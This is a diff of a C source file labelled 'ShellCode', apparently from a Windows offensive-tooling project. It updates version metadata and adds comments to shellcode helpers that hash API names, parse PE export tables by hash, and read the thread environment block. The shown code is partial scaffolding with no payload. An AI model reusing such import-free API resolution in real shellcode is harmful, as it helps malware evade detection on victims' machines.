@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015
+*  (C) COPYRIGHT AUTHORS, 2015 - 2017
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.90
+*  VERSION:     2.57
 *
-*  DATE:        16 Sept 2015
+*  DATE:        06 Mar 2017
 *
 *  ShellCode.
 *
@@ -21,7 +21,7 @@
 #pragma warning(disable: 4005) // macro redefinition
 
 #include <Windows.h>
-#include "..\Shared\ntos.h"
+#include "shared\ntos.h"
 
 #if (_MSC_VER >= 1900) 
 #ifdef _DEBUG
@@ -35,6 +35,14 @@
 typedef HMODULE(WINAPI *pfnLoadLibraryA)(LPCSTR lpLibFileName);
 typedef DWORD(WINAPI *pfnExpandEnvironmentStringsA)(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize);
 
+/*
+* gethash
+*
+* Purpose:
+*
+* Used in shellcode, calculates specific hash for string.
+*
+*/
 DWORD gethash(char *s)
 {
 	DWORD h = 0;
@@ -48,6 +56,14 @@ DWORD gethash(char *s)
 	return h;
 }
 
+/*
+* rawGetProcAddress
+*
+* Purpose:
+*
+* GetProcAddress small implementation for shellcode.
+*
+*/
 PVOID rawGetProcAddress(PVOID Module, DWORD hash)
 {
 	PIMAGE_DOS_HEADER           dosh = (PIMAGE_DOS_HEADER)Module;
@@ -69,6 +85,14 @@ PVOID rawGetProcAddress(PVOID Module, DWORD hash)
 	return NULL;
 }
 
+/*
+* main
+*
+* Purpose:
+*
+* Shellcode entry point.
+*
+*/
 void main()
 {
 	PTEB                            teb = (PTEB)__readfsdword(0x18);
